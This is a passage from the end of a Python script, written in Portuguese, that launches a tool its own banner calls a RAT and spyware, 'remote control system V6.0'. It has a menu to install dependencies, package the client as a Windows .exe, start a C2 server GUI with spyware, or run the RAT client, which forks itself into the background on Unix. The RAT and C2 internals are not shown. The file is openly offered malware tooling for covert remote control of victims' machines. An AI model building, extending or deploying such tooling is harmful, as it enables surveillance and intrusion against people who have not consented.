   ║     ██╔══██╗██╔══██╗╚══██╔══╝                              ║
   ║     ██████╔╝███████║   ██║                                 ║
   ║     ██╔══██╗██╔══██║   ██║                                 ║
   ║     ██║  ██║██║  ██║   ██║                                 ║
   ║     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                                 ║
   ║                                                              ║
   ║     {Cores.AZUL}SISTEMA DE CONTROLE REMOTO V6.0{Cores.RESET}{Cores.VERMELHO}                    ║
   ║     {Cores.CIANO}>> {Cores.AMARELO}SPYWARE COM JANELA SEPARADA{Cores.RESET}{Cores.VERMELHO}         ║
   ║                                                              ║
   ╚══════════════════════════════════════════════════════════════╝{Cores.RESET}
""")
    
    print(f"""
{Cores.CIANO}{Cores.NEGRITO}╔═══════════════════════════════════════════════════════════════╗{Cores.RESET}
{Cores.CIANO}{Cores.NEGRITO}║  {Cores.AMARELO}OPÇÕES:{Cores.RESET}{Cores.CIANO}                                                     ║{Cores.RESET}
{Cores.CIANO}{Cores.NEGRITO}╠═══════════════════════════════════════════════════════════════╣{Cores.RESET}
{Cores.CIANO}║  {Cores.VERDE}[1]{Cores.RESET}  Instalar dependências e gerar .exe            {Cores.CIANO}║{Cores.RESET}
{Cores.CIANO}║  {Cores.VERDE}[2]{Cores.RESET}  Apenas instalar dependências                  {Cores.CIANO}║{Cores.RESET}
{Cores.CIANO}║  {Cores.VERDE}[3]{Cores.RESET}  Iniciar {Cores.VERMELHO}C2{Cores.RESET} com SPYWARE             {Cores.CIANO}║{Cores.RESET}
{Cores.CIANO}║  {Cores.VERDE}[4]{Cores.RESET}  Iniciar {Cores.VERMELHO}CLIENTE{Cores.RESET} RAT (Terminal)        {Cores.CIANO}║{Cores.RESET}
{Cores.CIANO}║  {Cores.VERDE}[5]{Cores.RESET}  Sair                                        {Cores.CIANO}║{Cores.RESET}
{Cores.CIANO}{Cores.NEGRITO}╚═══════════════════════════════════════════════════════════════╝{Cores.RESET}
""")
    
    opcao = input(f"{Cores.AMARELO}Escolha uma opção: {Cores.RESET}").strip()
    return opcao

def main():
    if len(sys.argv) > 1:
        if sys.argv[1] == '--server':
            if TKINTER_DISPONIVEL:
                gui = ServidorC2GUI()
                gui.run()
            else:
                print("[ERRO] Tkinter não disponível")
            return
        elif sys.argv[1] == '--client':
            if os.name == 'posix' and os.fork() > 0:
                return
            rat = RAT()
            rat.rodar()
            return
    
    while True:
        opcao = menu_principal()
        
        if opcao == '1':
            instalar_dependencias()
            gerar_exe()
            input(f"\n{Cores.CIANO}Pressione Enter para continuar...{Cores.RESET}")
        elif opcao == '2':
            instalar_dependencias()
            input(f"\n{Cores.CIANO}Pressione Enter para continuar...{Cores.RESET}")
        elif opcao == '3':
            if TKINTER_DISPONIVEL:
                gui = ServidorC2GUI()
                gui.run()
            else:
                print(f"{Cores.VERMELHO}[ERRO] Tkinter não disponível{Cores.RESET}")
                input(f"{Cores.CIANO}Pressione Enter...{Cores.RESET}")
        elif opcao == '4':
            if os.name == 'posix' and os.fork() > 0:
                return
            limpar_tela()
            rat = RAT()
            rat.rodar()
        elif opcao == '5':
            print(f"\n{Cores.AMARELO}[*] Saindo...{Cores.RESET}")
            break
        else:
            print(f"{Cores.VERMELHO}[!] Opção inválida!{Cores.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()